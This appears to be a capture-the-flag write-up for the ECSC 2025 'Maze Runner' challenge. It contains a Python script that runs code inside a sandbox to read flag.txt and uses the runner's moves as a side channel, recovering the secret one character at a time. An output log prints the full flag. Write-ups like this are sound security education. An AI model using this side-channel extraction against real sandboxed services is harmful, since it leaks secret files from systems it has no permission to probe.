# Maze Runner

We can run code that defines moves for the runner, however, everything is ran in a sandbox. The only output we get is what moves were made. Using it, we can guess the flag one by one character. If the guess is correct, we move the runner to the left, otherwise - to the right. Solution:
```py
import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-0123456789!@#$%^&*()_+-=,.<>"

url = "https://maze-runner.ecsc25.hack.cert.pl"

index = 0
flag = ""

while True:
    finished = False
    
    for guess in chars:
        code = f"""
f = open('flag.txt').read()

if f[{index}] == "{guess}":
    return 0
else:
    return 1
"""
        
        res = requests.post(f'{url}/submit', json={
            'code': code
        })
        
        move = res.json()['moves'][0]
        
        if move == 0:
            flag += guess
            index += 1
            print(flag)
            
            if guess == "}":
                finished = True
            break
        
    if finished:
        break

# e
# ec
# ecs
# ecsc
# ecsc2
# ecsc25
# ecsc25{
# ecsc25{t
# ecsc25{th
# ecsc25{the
# ecsc25{the_
# ecsc25{the_r
# ecsc25{the_r3
# ecsc25{the_r3a
# ecsc25{the_r3al
# ecsc25{the_r3al_
# ecsc25{the_r3al_m
# ecsc25{the_r3al_m4
# ecsc25{the_r3al_m4z
# ecsc25{the_r3al_m4ze
# ecsc25{the_r3al_m4ze_
# ecsc25{the_r3al_m4ze_w
# ecsc25{the_r3al_m4ze_wa
# ecsc25{the_r3al_m4ze_was
# ecsc25{the_r3al_m4ze_was_
# ecsc25{the_r3al_m4ze_was_t
# ecsc25{the_r3al_m4ze_was_th
# ecsc25{the_r3al_m4ze_was_th3
# ecsc25{the_r3al_m4ze_was_th3_
# ecsc25{the_r3al_m4ze_was_th3_f
# ecsc25{the_r3al_m4ze_was_th3_fr
# ecsc25{the_r3al_m4ze_was_th3_fr1
# ecsc25{the_r3al_m4ze_was_th3_fr1e
# ecsc25{the_r3al_m4ze_was_th3_fr1en
# ecsc25{the_r3al_m4ze_was_th3_fr1end
# ecsc25{the_r3al_m4ze_was_th3_fr1ends
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_w
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4d
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_a
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0n
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_t
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_th
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_w
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_wa
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_way
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_way!
# ecsc25{the_r3al_m4ze_was_th3_fr1ends_we_m4de_al0ng_the_way!}
```